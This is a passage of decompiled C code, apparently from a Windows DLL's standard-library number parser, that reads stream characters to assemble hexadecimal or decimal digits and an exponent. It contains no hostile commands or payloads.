    "        *(_BYTE *)(a3 + 8) = 1;",
    "      }",
    "      else",
    "      {",
    "        *(_BYTE *)(a3 + 8) = 0;",
    "      }",
    "    }",
    "  }",
    "  *a1 = 48;",
    "  v35 = a1 + 1;",
    "  v233 = v35;",
    "  v227 = 0;",
    "  v36 = 0;",
    "  v226 = 0;",
    "  if ( !sub_18000E050((__int64 *)a3, a4) )",
    "  {",
    "    if ( !*(_BYTE *)(a3 + 8) )",
    "    {",
    "      v37 = *(_QWORD *)a3;",
    "      if ( !*(_QWORD *)a3",
    "        || ((v38 = **(unsigned __int8 ***)(v37 + 56)) == 0 || **(int **)(v37 + 80) <= 0",
    "          ? (v39 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v37 + 48LL))(v37))",
    "          : (v39 = *v38),",
    "            v39 == -1) )",
    "      {",
    "        *(_QWORD *)a3 = 0;",
    "      }",
    "      else",
    "      {",
    "        *(_BYTE *)(a3 + 9) = v39;",
    "      }",
    "      *(_BYTE *)(a3 + 8) = 1;",
    "    }",
    "    if ( *(_BYTE *)(a3 + 9) == v230 )",
    "    {",
    "      v40 = *(_QWORD *)a3;",
    "      if ( !*(_QWORD *)a3",
    "        || (!**(_QWORD **)(v40 + 56) || (v41 = *(int **)(v40 + 80), *v41 <= 0)",
    "          ? (v44 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v40 + 56LL))(v40))",
    "          : (--*v41, v42 = *(unsigned __int8 ***)(v40 + 56), v43 = *v42, ++*v42, v44 = *v43),",
    "            v44 == -1) )",
    "      {",
    "        *(_QWORD *)a3 = 0;",
    "        v45 = 1;",
    "      }",
    "      else",
    "      {",
    "        v45 = 0;",
    "      }",
    "      *(_BYTE *)(a3 + 8) = v45;",
    "      if ( sub_18000E050((__int64 *)a3, a4) )",
    "      {",
    "        *v35 = 0;",
    "        v8 = (v225 << 8) | 0xA;",
    "LABEL_76:",
    "        v46 = v8;",
    "        goto LABEL_77;",
    "      }",
    "      if ( !*(_BYTE *)(a3 + 8) )",
    "      {",
    "        v50 = *(_QWORD *)a3;",
    "        if ( !*(_QWORD *)a3",
    "          || ((v51 = **(unsigned __int8 ***)(v50 + 56)) == 0 || **(int **)(v50 + 80) <= 0",
    "            ? (v52 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v50 + 48LL))(v50))",
    "            : (v52 = *v51),",
    "              v52 == -1) )",
    "        {",
    "          *(_QWORD *)a3 = 0;",
    "        }",
    "        else",
    "        {",
    "          *(_BYTE *)(a3 + 9) = v52;",
    "        }",
    "        *(_BYTE *)(a3 + 8) = 1;",
    "      }",
    "      v53 = *(_BYTE *)(a3 + 9);",
    "      if ( v53 == v247[25] || v53 == v247[24] )",
    "      {",
    "        v227 = 1;",
    "        v54 = *(_QWORD *)a3;",
    "        if ( !*(_QWORD *)a3",
    "          || (!**(_QWORD **)(v54 + 56) || (v55 = *(int **)(v54 + 80), *v55 <= 0)",
    "            ? (v58 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v54 + 56LL))(v54))",
    "            : (--*v55, v56 = *(unsigned __int8 ***)(v54 + 56), v57 = *v56, ++*v56, v58 = *v57),",
    "              v58 == -1) )",
    "        {",
    "          *(_QWORD *)a3 = 0;",
    "          v59 = 1;",
    "        }",
    "        else",
    "        {",
    "          v59 = 0;",
    "        }",
    "        *(_BYTE *)(a3 + 8) = v59;",
    "        *v35++ = 120;",
    "        v233 = v35;",
    "      }",
    "      else",
    "      {",
    "        v36 = 1;",
    "        v226 = 1;",
    "      }",
    "    }",
    "  }",
    "  v235 = 0;",
    "  v60 = 0;",
    "  v237 = 0;",
    "  v238 = 0;",
    "  v61 = 10;",
    "  if ( v227 )",
    "    v61 = 22;",
    "  v239 = v61;",
    "  if ( !v245 )",
    "  {",
    "    v62 = a4;",
    "    for ( i = v61; !sub_18000E050((__int64 *)a3, a4); v62 = a4 )",
    "    {",
    "      if ( !*(_BYTE *)(a3 + 8) )",
    "      {",
    "        v64 = *(_QWORD *)a3;",
    "        if ( !*(_QWORD *)a3",
    "          || ((v65 = **(unsigned __int8 ***)(v64 + 56)) == 0 || **(int **)(v64 + 80) <= 0",
    "            ? (v66 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v64 + 48LL))(v64))",
    "            : (v66 = *v65),",
    "              v66 == -1) )",
    "        {",
    "          *(_QWORD *)a3 = 0;",
    "        }",
    "        else",
    "        {",
    "          *(_BYTE *)(a3 + 9) = v66;",
    "        }",
    "        *(_BYTE *)(a3 + 8) = 1;",
    "      }",
    "      v67 = sub_180011120(v247, v248, *(unsigned __int8 *)(a3 + 9)) - (_QWORD)v247;",
    "      if ( v67 >= v239 )",
    "        break;",
    "      if ( v60 < a2 )",
    "      {",
    "        if ( v67 || v60 )",
    "        {",
    "          *v35++ = a0123456789abcd_0[v67];",
    "          v233 = v35;",
    "          ++v60;",
    "        }",
    "      }",
    "      else",
    "      {",
    "        ++v238;",
    "        if ( v67 )",
    "          v235 = 1;",
    "      }",
    "      v226 = 1;",
    "      v68 = *(_QWORD *)a3;",
    "      if ( !*(_QWORD *)a3",
    "        || (!**(_QWORD **)(v68 + 56) || (v69 = *(int **)(v68 + 80), *v69 <= 0)",
    "          ? (v72 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v68 + 56LL))(v68))",
    "          : (--*v69, v70 = *(unsigned __int8 ***)(v68 + 56), v71 = *v70, ++*v70, v72 = *v71),",
    "            v72 == -1) )",
    "      {",
    "        *(_QWORD *)a3 = 0;",
    "        v73 = 1;",
    "      }",
    "      else",
    "      {",
    "        v73 = 0;",
    "      }",
    "      *(_BYTE *)(a3 + 8) = v73;",
    "    }",
    "    goto LABEL_263;",
    "  }",
    "  for ( ; !sub_18000E050((__int64 *)a3, a4); v225 = 1 )",
    "  {",
    "    if ( !*(_BYTE *)(a3 + 8) )",
    "    {",
    "      v74 = *(_QWORD *)a3;",
    "      if ( !*(_QWORD *)a3",
    "        || ((v75 = **(unsigned __int8 ***)(v74 + 56)) == 0 || **(int **)(v74 + 80) <= 0",
    "          ? (v76 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v74 + 48LL))(v74))",
    "          : (v76 = *v75),",
    "            v76 == -1) )",
    "      {",
    "        *(_QWORD *)a3 = 0;",
    "      }",
    "      else",
    "      {",
    "        *(_BYTE *)(a3 + 9) = v76;",
    "      }",
    "      *(_BYTE *)(a3 + 8) = 1;",
    "    }",
    "    if ( *(_BYTE *)(a3 + 9) != v11 )",
    "      break;",
    "    v77 = *(_QWORD *)a3;",
    "    if ( !*(_QWORD *)a3",
    "      || (!**(_QWORD **)(v77 + 56) || (v78 = *(int **)(v77 + 80), *v78 <= 0)",
    "        ? (v81 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v77 + 56LL))(v77))",
    "        : (--*v78, v79 = *(unsigned __int8 ***)(v77 + 56), v80 = *v79, ++*v79, v81 = *v80),",
    "          v81 == -1) )",
    "    {",
    "      *(_QWORD *)a3 = 0;",
    "      v82 = 1;",
    "    }",
    "    else",
    "    {",
    "      v82 = 0;",
    "    }",
    "    *(_BYTE *)(a3 + 8) = v82;",
    "  }",
    "  sub_180006C20((__int64)v241, 1u, v36);",
    "  v83 = 0;",
    "  v84 = sub_18000E050((__int64 *)a3, a4);",
    "  v85 = v243;",
    "  v86 = v241[0];",
    "  if ( !v84 )",
    "  {",
    "    while ( 1 )",
    "    {",
    "      if ( !*(_BYTE *)(a3 + 8) )",
    "      {",
    "        v87 = *(_QWORD *)a3;",
    "        if ( !*(_QWORD *)a3",
    "          || ((v88 = **(unsigned __int8 ***)(v87 + 56)) == 0 || **(int **)(v87 + 80) <= 0",
    "            ? (v89 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v87 + 48LL))(v87))",
    "            : (v89 = *v88),",
    "              v89 == -1) )",
    "        {",
    "          *(_QWORD *)a3 = 0;",
    "        }",
    "        else",
    "        {",
    "          *(_BYTE *)(a3 + 9) = v89;",
    "        }",
    "        *(_BYTE *)(a3 + 8) = 1;",
    "      }",
    "      v90 = sub_180011120(v247, v248, *(unsigned __int8 *)(a3 + 9)) - (_QWORD)v247;",
    "      if ( v90 >= v239 )",
    "      {",
    "        if ( !*(_BYTE *)(a3 + 8) )",
    "        {",
    "          v93 = *(_QWORD *)a3;",
    "          if ( !*(_QWORD *)a3",
    "            || ((v94 = **(unsigned __int8 ***)(v93 + 56)) == 0 || **(int **)(v93 + 80) <= 0",
    "              ? (v95 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v93 + 48LL))(v93))",
    "              : (v95 = *v94),",
    "                v95 == -1) )",
    "          {",
    "            *(_QWORD *)a3 = 0;",
    "          }",
    "          else",
    "          {",
    "            *(_BYTE *)(a3 + 9) = v95;",
    "          }",
    "          *(_BYTE *)(a3 + 8) = 1;",
    "        }",
    "        if ( *(_BYTE *)(a3 + 9) != v11 )",
    "        {",
    "LABEL_211:",
    "          v237 = v60;",
    "          if ( v83 )",
    "          {",
    "            v105 = v241;",
    "            if ( v85 > 0xF )",
    "              v105 = (unsigned __int64 *)v86;",
    "            if ( *((char *)v105 + v83) <= 0 )",
    "              v225 = 1;",
    "            else",
    "              ++v83;",
    "          }",
    "          break;",
    "        }",
    "        v96 = v241;",
    "        if ( v85 > 0xF )",
    "          v96 = (unsigned __int64 *)v86;",
    "        if ( !*((_BYTE *)v96 + v83) )",
    "        {",
    "          v225 = 1;",
    "          goto LABEL_202;",
    "        }",
    "        v97 = v242;",
    "        if ( v242 >= v85 )",
    "        {",
    "          sub_18000AD70(v241, 1u, 0, 0);",
    "        }",
    "        else",
    "        {",
    "          ++v242;",
    "          v98 = v241;",
    "          if ( v85 > 0xF )",
    "            v98 = (unsigned __int64 *)v86;",
    "          *(_WORD *)((char *)v98 + v97) = 0;",
    "        }",
    "        ++v83;",
    "      }",
    "      else",
    "      {",
    "        v226 = 1;",
    "        if ( v60 < a2 )",
    "        {",
    "          if ( v90 || v60 )",
    "          {",
    "            *v233++ = a0123456789abcd_0[v90];",
    "            ++v60;",
    "          }",
    "        }",
    "        else",
    "        {",
    "          ++v238;",
    "          if ( v90 )",
    "            v235 = 1;",
    "        }",
    "        v91 = v241;",
    "        if ( v85 > 0xF )",
    "          v91 = (unsigned __int64 *)v86;",
    "        if ( *((_BYTE *)v91 + v83) == 127 )",
    "          goto LABEL_202;",
    "        v92 = v241;",
    "        if ( v85 > 0xF )",
    "          v92 = (unsigned __int64 *)v86;",
    "        ++*((_BYTE *)v92 + v83);",
    "      }",
    "      v86 = v241[0];",
    "      v85 = v243;",
    "LABEL_202:",
    "      v99 = *(_QWORD *)a3;",
    "      if ( !*(_QWORD *)a3",
    "        || (!**(_QWORD **)(v99 + 56) || (v100 = *(int **)(v99 + 80), *v100 <= 0)",
    "          ? (v103 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v99 + 56LL))(v99))",
    "          : (--*v100, v101 = *(unsigned __int8 ***)(v99 + 56), v102 = *v101, ++*v101, v103 = *v102),",
    "            v103 == -1) )",
    "      {",
    "        *(_QWORD *)a3 = 0;",
    "        v104 = 1;",
    "      }",
    "      else",
    "      {",
    "        v104 = 0;",
    "      }",
    "      *(_BYTE *)(a3 + 8) = v104;",
    "      if ( sub_18000E050((__int64 *)a3, a4) )",
    "        goto LABEL_211;",
    "    }",
    "  }",
    "  if ( !sub_18000E050((__int64 *)a3, a4) )",
    "  {",
    "    do",
    "    {",
    "      if ( !*(_BYTE *)(a3 + 8) )",
    "      {",
    "        v106 = *(_QWORD *)a3;",
    "        if ( !*(_QWORD *)a3",
    "          || ((v107 = **(unsigned __int8 ***)(v106 + 56)) == 0 || **(int **)(v106 + 80) <= 0",
    "            ? (v108 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v106 + 48LL))(v106))",
    "            : (v108 = *v107),",
    "              v108 == -1) )",
    "        {",
    "          *(_QWORD *)a3 = 0;",
    "        }",
    "        else",
    "        {",
    "          *(_BYTE *)(a3 + 9) = v108;",
    "        }",
    "        *(_BYTE *)(a3 + 8) = 1;",
    "      }",
    "      if ( *(_BYTE *)(a3 + 9) != v11 )",
    "        break;",
    "      v109 = *(_QWORD *)a3;",
    "      if ( !*(_QWORD *)a3",
    "        || (!**(_QWORD **)(v109 + 56) || (v110 = *(int **)(v109 + 80), *v110 <= 0)",
    "          ? (v113 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v109 + 56LL))(v109))",
    "          : (--*v110, v111 = *(unsigned __int8 ***)(v109 + 56), v112 = *v111, ++*v111, v113 = *v112),",
    "            v113 == -1) )",
    "      {",
    "        *(_QWORD *)a3 = 0;",
    "        v114 = 1;",
    "      }",
    "      else",
    "      {",
    "        v114 = 0;",
    "      }",
    "      *(_BYTE *)(a3 + 8) = v114;",
    "      v225 = 1;",
    "    }",
    "    while ( !sub_18000E050((__int64 *)a3, a4) );",
    "    v60 = v237;",
    "  }",
    "  v115 = (char *)v244;",
    "  if ( v246 > 0xF )",
    "    v115 = (char *)v244[0];",
    "  v116 = &v115[v245];",
    "  v117 = 0;",
    "  if ( !v225 )",
    "  {",
    "    while ( v83 )",
    "    {",
    "      if ( v115 != v116 )",
    "        v117 = *v115;",
    "      v118 = v115 + 1;",
    "      if ( v115 == v116 )",
    "        v118 = v115;",
    "      v115 = v118;",
    "      --v83;",
    "      if ( (unsigned __int8)(v117 - 1) <= 0x7Du )",
    "      {",
    "        if ( v83 )",
    "        {",
    "          v119 = v241;",
    "          if ( v85 > 0xF )",
    "            v119 = (unsigned __int64 *)v86;",
    "          if ( *((_BYTE *)v119 + v83) != v117 )",
    "            goto LABEL_257;",
    "        }",
    "        else",
    "        {",
    "          v120 = v241;",
    "          if ( v85 > 0xF )",
    "            v120 = (unsigned __int64 *)v86;",
    "          if ( *(char *)v120 > v117 )",
    "          {",
    "LABEL_257:",
    "            v225 = 1;",
    "            break;",
    "          }",
    "        }",
    "      }",
    "    }",
    "  }",
    "  if ( v85 > 0xF )",
    "  {",
    "    v121 = v85 + 1;",
    "    v122 = v86;",
    "    if ( v85 + 1 >= 0x1000 )",
    "    {",
    "      v121 = v85 + 40;",
    "      v86 = *(_QWORD *)(v86 - 8);",
    "      if ( v122 - v86 - 8 > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_1800116E0(v86, v121);",
    "  }",
    "  v62 = a4;",
    "  i = v239;",
    "  v35 = v233;",
    "  v10 = v240;",
    "LABEL_263:",
    "  if ( v227 && v226 && !v60 )",
    "  {",
    "    *v35 = 48;",
    "    v233 = v35 + 1;",
    "  }",
    "  v123 = **(_BYTE **)sub_18001A6FC();",
    "  v228 = v123;",
    "  if ( sub_18000E050((__int64 *)a3, v62) )",
    "  {",
    "    v129 = v233;",
    "  }",
    "  else",
    "  {",
    "    if ( !*(_BYTE *)(a3 + 8) )",
    "    {",
    "      v124 = *(_QWORD *)a3;",
    "      if ( !*(_QWORD *)a3",
    "        || ((v125 = **(unsigned __int8 ***)(v124 + 56)) == 0 || **(int **)(v124 + 80) <= 0",
    "          ? (v126 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v124 + 48LL))(v124))",
    "          : (v126 = *v125),",
    "            v126 == -1) )",
    "      {",
    "        *(_QWORD *)a3 = 0;",
    "      }",
    "      else",
    "      {",
    "        *(_BYTE *)(a3 + 9) = v126;",
    "      }",
    "      *(_BYTE *)(a3 + 8) = 1;",
    "    }",
    "    v127 = *(_BYTE *)(a3 + 9);",
    "    v128 = v127 == (*(char (__fastcall **)(__int64))(*(_QWORD *)v10 + 24LL))(v10);",
    "    v129 = v233;",
    "    if ( v128 )",
    "    {",
    "      *v233 = v123;",
    "      v129 = ++v233;",
    "      v130 = *(_QWORD *)a3;",
    "      if ( !*(_QWORD *)a3",
    "        || (!**(_QWORD **)(v130 + 56) || (v131 = *(int **)(v130 + 80), *v131 <= 0)",
    "          ? (v134 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v130 + 56LL))(v130))",
    "          : (--*v131, v132 = *(unsigned __int8 ***)(v130 + 56), v133 = *v132, ++*v132, v134 = *v133),",
    "            v134 == -1) )",
    "      {",
    "        *(_QWORD *)a3 = 0;",
    "        *(_BYTE *)(a3 + 8) = 1;",
    "      }",
    "      else",
    "      {",
    "        *(_BYTE *)(a3 + 8) = 0;",
    "      }",
    "    }",
    "  }",
    "  if ( !v60 && !sub_18000E050((__int64 *)a3, a4) )",
    "  {",
    "    v135 = v238;",
    "    do",
    "    {",
    "      if ( !*(_BYTE *)(a3 + 8) )",
    "      {",
    "        v136 = *(_QWORD *)a3;",
    "        if ( !*(_QWORD *)a3",
    "          || ((v137 = **(unsigned __int8 ***)(v136 + 56)) == 0 || **(int **)(v136 + 80) <= 0",
    "            ? (v138 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v136 + 48LL))(v136))",
    "            : (v138 = *v137),",
    "              v138 == -1) )",
    "        {",
    "          *(_QWORD *)a3 = 0;",
    "        }",
    "        else",
    "        {",
    "          *(_BYTE *)(a3 + 9) = v138;",
    "        }",
    "        *(_BYTE *)(a3 + 8) = 1;",
    "      }",
    "      if ( *(_BYTE *)(a3 + 9) != v230 )",
    "        break;",
    "      --v135;",
    "      v226 = 1;",
    "      v139 = *(_QWORD *)a3;",
    "      if ( !*(_QWORD *)a3",
    "        || (!**(_QWORD **)(v139 + 56) || (v140 = *(int **)(v139 + 80), *v140 <= 0)",
    "          ? (v143 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v139 + 56LL))(v139))",
    "          : (--*v140, v141 = *(unsigned __int8 ***)(v139 + 56), v142 = *v141, ++*v141, v143 = *v142),",
    "            v143 == -1) )",
    "      {",
    "        *(_QWORD *)a3 = 0;",
    "        v144 = 1;",
    "      }",
    "      else",
    "      {",
    "        v144 = 0;",
    "      }",
    "      *(_BYTE *)(a3 + 8) = v144;",
    "    }",
    "    while ( !sub_18000E050((__int64 *)a3, a4) );",
    "    v238 = v135;",
    "    v129 = v233;",
    "    i = v239;",
    "  }",
    "  if ( !sub_18000E050((__int64 *)a3, a4) )",
    "  {",
    "    v145 = v235;",
    "    do",
    "    {",
    "      if ( !*(_BYTE *)(a3 + 8) )",
    "      {",
    "        v146 = *(_QWORD *)a3;",
    "        if ( !*(_QWORD *)a3",
    "          || ((v147 = **(unsigned __int8 ***)(v146 + 56)) == 0 || **(int **)(v146 + 80) <= 0",
    "            ? (v148 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v146 + 48LL))(v146))",
    "            : (v148 = *v147),",
    "              v148 == -1) )",
    "        {",
    "          *(_QWORD *)a3 = 0;",
    "        }",
    "        else",
    "        {",
    "          *(_BYTE *)(a3 + 9) = v148;",
    "        }",
    "        *(_BYTE *)(a3 + 8) = 1;",
    "      }",
    "      v149 = sub_180011120(v247, v248, *(unsigned __int8 *)(a3 + 9)) - (_QWORD)v247;",
    "      if ( v149 >= i )",
    "        break;",
    "      if ( v60 >= a2 )",
    "      {",
    "        if ( v149 )",
    "          v145 = 1;",
    "      }",
    "      else",
    "      {",
    "        *v129++ = a0123456789abcd_0[v149];",
    "        ++v60;",
    "      }",
    "      v226 = 1;",
    "      v150 = *(_QWORD *)a3;",
    "      if ( !*(_QWORD *)a3",
    "        || (!**(_QWORD **)(v150 + 56) || (v151 = *(int **)(v150 + 80), *v151 <= 0)",
    "          ? (v154 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v150 + 56LL))(v150))",
    "          : (--*v151, v152 = *(unsigned __int8 ***)(v150 + 56), v153 = *v152, ++*v152, v154 = *v153),",
    "            v154 == -1) )",
    "      {",
    "        *(_QWORD *)a3 = 0;",
    "        v155 = 1;",
    "      }",
    "      else",
    "      {",
    "        v155 = 0;",
    "      }",
    "      *(_BYTE *)(a3 + 8) = v155;",
    "    }",
    "    while ( !sub_18000E050((__int64 *)a3, a4) );",
    "    v233 = v129;",
    "    v235 = v145;",
    "    v123 = v228;",
    "  }",
    "  v156 = (char *)v233;",
    "  if ( v235 )",
    "  {",
    "    v157 = (char *)&v233[-(*(v233 - 1) == v123) - 1];",
    "    v158 = *v157;",
    "    if ( *v157 == 48 )",
    "      goto LABEL_344;",
    "    v159 = 53;",
    "    if ( v227 )",
    "      v159 = 56;",
    "    if ( v158 == v159 )",
    "LABEL_344:",
    "      *v157 = v158 + 1;",
    "  }",
    "  v160 = 20;",
    "  if ( v227 )",
    "    v160 = 27;",
    "  v161 = v247[v160];",
    "  v162 = 14;",
    "  if ( v227 )",
    "    v162 = 26;",
    "  v163 = v247[v162];",
    "  v164 = 0;",
    "  v229 = 0;",
    "  v165 = 0;",
    "  if ( !v226 )",
    "    goto LABEL_76;",
    "  if ( !sub_18000E050((__int64 *)a3, a4) )",
    "  {",
    "    if ( !*(_BYTE *)(a3 + 8) )",
    "    {",
    "      v166 = *(_QWORD *)a3;",
    "      if ( !*(_QWORD *)a3",
    "        || ((v167 = **(unsigned __int8 ***)(v166 + 56)) == 0 || **(int **)(v166 + 80) <= 0",
    "          ? (v168 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v166 + 48LL))(v166))",
    "          : (v168 = *v167),",
    "            v168 == -1) )",
    "      {",
    "        *(_QWORD *)a3 = 0;",
    "      }",
    "      else",
    "      {",
    "        *(_BYTE *)(a3 + 9) = v168;",
    "      }",
    "      *(_BYTE *)(a3 + 8) = 1;",
    "    }",
    "    v169 = *(_BYTE *)(a3 + 9);",
    "    if ( v169 == v161 || v169 == v163 )",
    "    {",
    "      v170 = *(_QWORD *)a3;",
    "      if ( !*(_QWORD *)a3",
    "        || (!**(_QWORD **)(v170 + 56) || (v171 = *(int **)(v170 + 80), *v171 <= 0)",
    "          ? (v174 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v170 + 56LL))(v170))",
    "          : (--*v171, v172 = *(unsigned __int8 ***)(v170 + 56), v173 = *v172, ++*v172, v174 = *v173),",
    "            v174 == -1) )",
    "      {",
    "        *(_QWORD *)a3 = 0;",
    "        v175 = 1;",
    "      }",
    "      else",
    "      {",
    "        v175 = 0;",
    "      }",
    "      *(_BYTE *)(a3 + 8) = v175;",
    "      v176 = 0;",
    "      if ( !sub_18000E050((__int64 *)a3, a4) )",
    "      {",
    "        if ( !*(_BYTE *)(a3 + 8) )",
    "        {",
    "          v177 = *(_QWORD *)a3;",
    "          if ( !*(_QWORD *)a3",
    "            || ((v178 = **(unsigned __int8 ***)(v177 + 56)) == 0 || **(int **)(v177 + 80) <= 0",
    "              ? (v179 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v177 + 48LL))(v177))",
    "              : (v179 = *v178),",
    "                v179 == -1) )",
    "          {",
    "            *(_QWORD *)a3 = 0;",
    "          }",
    "          else",
    "          {",
    "            *(_BYTE *)(a3 + 9) = v179;",
    "          }",
    "          *(_BYTE *)(a3 + 8) = 1;",
    "        }",
    "        v180 = *(_BYTE *)(a3 + 9);",
    "        if ( v180 == v231 )",
    "        {",
    "          v181 = *(_QWORD *)a3;",
    "          if ( !*(_QWORD *)a3",
    "            || (!**(_QWORD **)(v181 + 56) || (v182 = *(int **)(v181 + 80), *v182 <= 0)",
    "              ? (v185 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v181 + 56LL))(v181))",
    "              : (--*v182, v183 = *(unsigned __int8 ***)(v181 + 56), v184 = *v183, ++*v183, v185 = *v184),",
    "                v185 == -1) )",
    "          {",
    "            *(_QWORD *)a3 = 0;",
    "            *(_BYTE *)(a3 + 8) = 1;",
    "          }",
    "          else",
    "          {",
    "            *(_BYTE *)(a3 + 8) = 0;",
    "          }",
    "        }",
    "        else if ( v180 == v232 )",
    "        {",
    "          v164 = 1;",
    "          v229 = 1;",
    "          v186 = *(_QWORD *)a3;",
    "          if ( !*(_QWORD *)a3",
    "            || (!**(_QWORD **)(v186 + 56) || (v187 = *(int **)(v186 + 80), *v187 <= 0)",
    "              ? (v190 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v186 + 56LL))(v186))",
    "              : (--*v187, v188 = *(unsigned __int8 ***)(v186 + 56), v189 = *v188, ++*v188, v190 = *v189),",
    "                v190 == -1) )",
    "          {",
    "            *(_QWORD *)a3 = 0;",
    "            *(_BYTE *)(a3 + 8) = 1;",
    "          }",
    "          else",
    "          {",
    "            *(_BYTE *)(a3 + 8) = 0;",
    "          }",
    "        }",
    "      }",
    "      if ( !sub_18000E050((__int64 *)a3, a4) )",
    "      {",
    "        do",
    "        {",
    "          if ( !*(_BYTE *)(a3 + 8) )",
    "          {",
    "            v191 = *(_QWORD *)a3;",
    "            if ( !*(_QWORD *)a3",
    "              || ((v192 = **(unsigned __int8 ***)(v191 + 56)) == 0 || **(int **)(v191 + 80) <= 0",
    "                ? (v193 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v191 + 48LL))(v191))",
    "                : (v193 = *v192),",
    "                  v193 == -1) )",
    "            {",
    "              *(_QWORD *)a3 = 0;",
    "            }",
    "            else",
    "            {",
    "              *(_BYTE *)(a3 + 9) = v193;",
    "            }",
    "            *(_BYTE *)(a3 + 8) = 1;",
    "          }",
    "          if ( *(_BYTE *)(a3 + 9) != v230 )",
    "            break;",
    "          v176 = 1;",
    "          v194 = *(_QWORD *)a3;",
    "          if ( !*(_QWORD *)a3",
    "            || (!**(_QWORD **)(v194 + 56) || (v195 = *(int **)(v194 + 80), *v195 <= 0)",
    "              ? (v198 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v194 + 56LL))(v194))",
    "              : (--*v195, v196 = *(unsigned __int8 ***)(v194 + 56), v197 = *v196, ++*v196, v198 = *v197),",
    "                v198 == -1) )",
    "          {",
    "            *(_QWORD *)a3 = 0;",
    "            v199 = 1;",
    "          }",
    "          else",
    "          {",
    "            v199 = 0;",
    "          }",
    "          *(_BYTE *)(a3 + 8) = v199;",
    "        }",
    "        while ( !sub_18000E050((__int64 *)a3, a4) );",
    "        v156 = (char *)v233;",
    "      }",
    "      if ( !sub_18000E050((__int64 *)a3, a4) )",
    "      {",
    "        do",
    "        {",
    "          if ( !*(_BYTE *)(a3 + 8) )",
    "          {",
    "            v200 = *(_QWORD *)a3;",
    "            if ( !*(_QWORD *)a3",
    "              || ((v201 = **(unsigned __int8 ***)(v200 + 56)) == 0 || **(int **)(v200 + 80) <= 0",
    "                ? (v202 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v200 + 48LL))(v200))",
    "                : (v202 = *v201),",
    "                  v202 == -1) )",
    "            {",
    "              *(_QWORD *)a3 = 0;",
    "            }",
    "            else",
    "            {",
    "              *(_BYTE *)(a3 + 9) = v202;",
    "            }",
    "            *(_BYTE *)(a3 + 8) = 1;",
    "          }",
    "          v203 = sub_180011120(v247, v248, *(unsigned __int8 *)(a3 + 9)) - (_QWORD)v247;",
    "          if ( (unsigned __int64)v203 >= 0xA )",
    "            break;",
    "          v165 = v165 < 0xCCCCCCCCCCCCCCCLL || v165 == 0xCCCCCCCCCCCCCCCLL && v203 <= 7",
    "               ? v203 + 10 * v165",
    "               : 0x7FFFFFFFFFFFFFFFLL;",
    "          v176 = 1;",
    "          v204 = *(_QWORD *)a3;",
    "          if ( !*(_QWORD *)a3",
    "            || (!**(_QWORD **)(v204 + 56) || (v205 = *(int **)(v204 + 80), *v205 <= 0)",
    "              ? (v208 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v204 + 56LL))(v204))",
    "              : (--*v205, v206 = *(unsigned __int8 ***)(v204 + 56), v207 = *v206, ++*v206, v208 = *v207),",
    "                v208 == -1) )",
    "          {",
    "            *(_QWORD *)a3 = 0;",
    "            v209 = 1;",
    "          }",
    "          else",
    "          {",
    "            v209 = 0;",
    "          }",
    "          *(_BYTE *)(a3 + 8) = v209;",
    "        }",
    "        while ( !sub_18000E050((__int64 *)a3, a4) );",
    "        v164 = v229;",
    "        v156 = (char *)v233;",
    "      }",
    "      v210 = v165;",
    "      v165 = -v165;",
    "      if ( !v164 )",
    "        v165 = v210;",
    "      if ( !v176 )",
    "        goto LABEL_76;",
    "    }",
    "  }",
    "  v211 = 1100;",
    "  v212 = 1100;",
    "  if ( v227 )",
    "  {",
    "    v212 = 4200;",
    "    v211 = 1050;",
    "  }",
    "  v213 = v238;",
    "  while ( 1 )",
    "  {",
    "    v214 = v165 <= 0;",
    "    if ( v165 >= 0 )",
    "    {",
    "      if ( v213 >= 0 && (v165 >= v212 || v213 >= v211) )",
    "        goto LABEL_489;",
    "      v214 = v165 <= 0;",
    "    }",
    "    if ( v214 && v213 <= 0 && (v165 <= -v212 || v213 <= -v211) )",
    "    {",
    "      v212 = -v212;",
    "      goto LABEL_489;",
    "    }",
    "    v215 = -v165;",
    "    if ( v165 > 0 )",
    "      v215 = v165;",
    "    if ( v215 <= v212 )",
    "    {",
    "      v216 = -v213;",
    "      if ( v213 > 0 )",
    "        v216 = v213;",
    "      if ( v216 <= v211 )",
    "        break;",
    "    }",
    "    if ( v227 )",
    "      v215 = (v215 - 1) / 4 + 1;",
    "    v217 = -v238;",
    "    if ( v238 > 0 )",
    "      v217 = v238;",
    "    if ( v217 < v215 )",
    "      v215 = v217;",
    "    v218 = 4 * v215;",
    "    if ( v165 < 0 )",
    "    {",
    "      if ( !v227 )",
    "        v218 = v215;",
    "      v165 += v218;",
    "      v213 -= v215;",
    "    }",
    "    else",
    "    {",
    "      if ( !v227 )",
    "        v218 = v215;",
    "      v165 -= v218;",
    "      v213 += v215;",
    "    }",
    "  }",
    "  if ( v227 )",
    "    v213 *= 4;",
    "  v219 = v213 + v165;",
    "  if ( v219 <= v212 )",
    "  {",
    "    v220 = -v212;",
    "    v212 = v219;",
